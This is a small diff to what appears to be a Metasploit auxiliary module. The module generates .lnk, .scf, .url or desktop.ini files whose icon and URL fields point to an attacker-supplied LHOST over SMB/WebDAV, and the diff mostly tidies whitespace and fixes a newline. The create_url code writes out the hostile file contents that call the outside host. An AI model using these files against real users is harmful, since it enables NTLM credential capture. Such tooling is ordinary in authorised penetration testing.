@@ -35,7 +35,6 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
         OptString.new("FILENAME", [ true, "Filename - supports *.lnk, *.scf, *.url, desktop.ini", "word.lnk"]),
-
       ])
   end
 
@@ -49,9 +48,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif datastore['FILENAME'].chars.last(3).join=="url"
         create_url
     end
-
   end
-
 
   def createlnk
     #Code below taken from module droplnk.rb written by Mubix
@@ -129,13 +126,12 @@ class MetasploitModule < Msf::Auxiliary
     ini << "IconIndex=1337"
 
     file_create(ini)
-
   end
 
   def create_url
     url=""
     url << "[InternetShortcut]\n"
-    url << "URL=file://#{datastore['LHOST']}/url.html"
+    url << "URL=file://#{datastore['LHOST']}/url.html\n"
     url << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
 
     file_create(url)
